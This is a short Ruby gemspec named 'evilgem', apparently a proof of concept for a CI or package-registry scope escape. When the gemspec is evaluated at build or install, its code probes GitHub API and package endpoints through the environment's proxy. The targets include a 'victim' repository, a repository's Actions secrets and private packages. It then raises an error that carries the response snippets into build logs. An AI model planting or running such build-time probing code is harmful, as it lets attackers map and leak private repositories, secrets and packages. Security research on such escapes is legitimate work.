require "net/http"; require "uri"
MARK = "ESC1-6948f3"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def g(url)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else
    Net::HTTP.new(u.host, u.port)
  end
  h.use_ssl = (u.scheme == "https"); h.open_timeout = 15; h.read_timeout = 20
  r = h.get(u.request_uri, {"Accept" => "application/vnd.github+json", "User-Agent" => "probe"})
  [r.code, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}:#{e.message}"]
end
T = {
  "api_user"        => "https://api.github.com/user",
  "api_src_repo"    => "https://api.github.com/repos/czarflix-org/source-job",
  "api_victim_repo" => "https://api.github.com/repos/czarflix-org/victim",
  "api_pkgsrc_repo" => "https://api.github.com/repos/czarflix-org/pkgsrc",
  "api_org_secrets" => "https://api.github.com/repos/czarflix-org/source-job/actions/secrets",
  "pkg_granted"     => "https://rubygems.pkg.github.com/czarflix-org/info/cdxgranted",
  "npm_host"        => "https://npm.pkg.github.com/@czarflix-org%2ffoo",
}
res = ["#{MARK} pid=#{Process.pid}"]
T.each { |k, u| c, b = g(u); res << "#{k} http=#{c} bytes=#{b.bytesize} snip=#{b.gsub(/\s+/,' ')[0,70].inspect}" }
raise "#{MARK} :: " + res.join(" :: ")
Gem::Specification.new { |s| s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = [] }
